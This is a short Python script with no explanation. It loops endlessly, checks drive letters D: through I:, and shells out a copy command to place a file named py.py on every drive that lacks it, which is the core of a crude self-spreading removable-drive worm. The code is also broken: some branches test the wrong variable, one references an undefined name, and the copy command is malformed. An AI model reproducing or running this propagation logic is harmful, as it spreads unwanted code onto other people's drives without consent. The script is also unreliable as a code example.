import subprocess as sp
import ctypes
import os
import string
import platform
from itertools import count
import time

cwd = os.getcwd()
id = 0
for i in count(0):
    id = id + 1
    print(id)
    time.sleep(1)
    d = os.path.exists('D:')
    e = os.path.exists('E:')
    f = os.path.exists('F:')
    g = os.path.exists('G:')
    h = os.path.exists('H:')
    i = os.path.exists('I:')

    if d == True:
        dt = os.path.exists('D:\\py.py')
        if dt == False:
            os.popen('copy\\%s\\py.py D:\\' % cwd )
    
    if e == True:
        et = os.path.exists('E:\\py.py')
        if dt == False:
            os.popen('copy\\%s\\py.py E:\\' % cwd )

    if f == True:
        ft = os.path.exists('F:\\py.py')
        if Ft == False:
            os.popen('copy\\%s\\py.py F:\\' % cwd )

    if g == True:
        gt = os.path.exists('G:\\py.py')
        if dt == False:
            os.popen('copy\\%s\\py.py G:\\' % cwd )

    if h == True:
        ht = os.path.exists('H:\\py.py')
        if ht == False:
            os.popen('copy\\%s\\py.py H:\\' % cwd )

    if i == True:
        it = os.path.exists('I:\\py.py')
        if it == False:
            os.popen('copy\\%s\\py.py I:\\' % cwd )

#os.popen('copy\\%s\\py.py D:\\' % cwd )
    
    



